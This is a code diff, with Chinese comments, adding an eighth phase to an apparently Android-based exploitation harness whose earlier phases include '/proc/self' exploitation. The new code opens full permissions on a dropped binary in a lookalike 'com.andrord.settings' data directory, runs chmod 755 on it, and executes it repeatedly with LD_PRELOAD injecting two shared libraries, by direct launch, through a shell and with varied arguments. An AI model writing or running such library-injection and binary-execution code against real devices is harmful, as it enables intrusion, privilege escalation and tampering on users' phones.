@@ -72,6 +72,10 @@ public class Main {
         appendLog("========== PHASE 7: /proc/self Exploitation ==========");
         exploitProcSelf();
 
+        // 新增 Phase 8
+        appendLog("========== PHASE 8: Execute kdiag_common with LD_PRELOAD ==========");
+        executeKdiagCommon();
+
         appendLog("========== ALL TESTS COMPLETED ==========");
         appendLog("========================================");
         saveLog();
@@ -791,6 +795,128 @@ public class Main {
             }
         } catch (Exception e) {
             appendLog("  uid_map error: " + e.getMessage());
+        }
+    }
+
+    // ========== 新增 Phase 8: 执行 kdiag_common ==========
+    private static void executeKdiagCommon() {
+        String baseDir = "/data/data/com.andrord.settings/";
+        String binaryPath = baseDir + "kdiag_common";
+        String lib1 = baseDir + "libpredtm.so";
+        String lib2 = baseDir + "libdiag.so";
+        String ldPreload = lib1 + ":" + lib2;
+
+        File binary = new File(binaryPath);
+        if (!binary.exists()) {
+            appendLog("[EXEC] Binary not found: " + binaryPath);
+            return;
+        }
+
+        appendLog("[EXEC] Target binary: " + binaryPath);
+        appendLog("[EXEC] LD_PRELOAD: " + ldPreload);
+
+        // 1. 使用 Java File API 设置可执行权限
+        boolean chmodOk = binary.setExecutable(true, false);
+        appendLog("[EXEC] setExecutable(true) returned: " + chmodOk);
+        // 同时设置读、写权限（尝试全开）
+        binary.setReadable(true, false);
+        binary.setWritable(true, false);
+        appendLog("[EXEC] Final permissions: exists=" + binary.exists()
+                + ", canRead=" + binary.canRead()
+                + ", canWrite=" + binary.canWrite()
+                + ", canExecute=" + binary.canExecute());
+
+        // 2. 尝试通过系统 chmod 命令赋予 755 权限（可能更有效）
+        try {
+            Process chmodProc = Runtime.getRuntime().exec(new String[]{"/system/bin/chmod", "755", binaryPath});
+            int chmodExit = chmodProc.waitFor();
+            appendLog("[EXEC] chmod 755 exit code: " + chmodExit);
+        } catch (Exception e) {
+            appendLog("[EXEC] chmod via Runtime.exec failed: " + e.getMessage());
+        }
+
+        // ---- 多种执行方式 ----
+        // 3.1 直接执行 (ProcessBuilder)
+        runWithProcessBuilder(binaryPath, ldPreload, null, "Direct");
+
+        // 3.2 通过 /system/bin/sh -c
+        runWithProcessBuilder("/system/bin/sh", ldPreload, new String[]{"-c", binaryPath}, "Shell -c");
+
+        // 3.3 使用不同工作目录 (/data/local/tmp)
+        runWithProcessBuilder(binaryPath, ldPreload, null, "Different CWD", new File("/data/local/tmp"));
+
+        // 3.4 传递常见参数 (--help, -v, -version, test)
+        String[] testArgs = {"--help", "-v", "-version", "test"};
+        for (String arg : testArgs) {
+            runWithProcessBuilder(binaryPath, ldPreload, new String[]{arg}, "With arg '" + arg + "'");
+        }
+
+        // 3.5 使用 Runtime.exec 直接执行（不设置环境变量，无法 LD_PRELOAD，但作为对比）
+        try {
+            Process p = Runtime.getRuntime().exec(new String[]{binaryPath});
+            int exitCode = p.waitFor();
+            String output = readProcessOutput(p.getInputStream());
+            appendLog("[EXEC] Runtime.exec (no LD_PRELOAD) exit: " + exitCode + ", output: " + output);
+        } catch (Exception e) {
+            appendLog("[EXEC] Runtime.exec (no LD_PRELOAD) failed: " + e.getMessage());
+        }
+
+        // 3.6 使用 sh -c 内联设置 LD_PRELOAD
+        String shellCmd = "LD_PRELOAD=" + ldPreload + " " + binaryPath;
+        try {
+            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", shellCmd});
+            int exitCode = p.waitFor();
+            String output = readProcessOutput(p.getInputStream());
+            appendLog("[EXEC] sh -c with inline LD_PRELOAD exit: " + exitCode + ", output: " + output);
+        } catch (Exception e) {
+            appendLog("[EXEC] sh -c inline LD_PRELOAD failed: " + e.getMessage());
+        }
+
+        appendLog("[EXEC] All execution attempts completed.");
+    }
+
+    // 辅助方法：通过 ProcessBuilder 执行并记录结果
+    private static void runWithProcessBuilder(String command, String ldPreload, String[] args, String label) {
+        runWithProcessBuilder(command, ldPreload, args, label, null);
+    }
+
+    private static void runWithProcessBuilder(String command, String ldPreload, String[] args, String label, File workingDir) {
+        try {
+            ProcessBuilder pb;
+            if (args != null && args.length > 0) {
+                String[] cmd = new String[args.length + 1];
+                cmd[0] = command;
+                System.arraycopy(args, 0, cmd, 1, args.length);
+                pb = new ProcessBuilder(cmd);
+            } else {
+                pb = new ProcessBuilder(command);
+            }
+            pb.environment().put("LD_PRELOAD", ldPreload);
+            if (workingDir != null) {
+                pb.directory(workingDir);
+            }
+            pb.redirectErrorStream(true);
+            Process p = pb.start();
+            int exitCode = p.waitFor();
+            String output = readProcessOutput(p.getInputStream());
+            appendLog("[EXEC] " + label + " exit: " + exitCode + ", output: " + output);
+        } catch (Exception e) {
+            appendLog("[EXEC] " + label + " failed: " + e.getMessage());
+        }
+    }
+
+    // 辅助方法：读取进程输出流
+    private static String readProcessOutput(java.io.InputStream is) {
+        try {
+            byte[] buffer = new byte[4096];
+            int len;
+            StringBuilder sb = new StringBuilder();
+            while ((len = is.read(buffer)) != -1) {
+                sb.append(new String(buffer, 0, len, StandardCharsets.UTF_8));
+            }
+            return sb.toString().trim();
+        } catch (Exception e) {
+            return "(read error: " + e.getMessage() + ")";
         }
     }
 
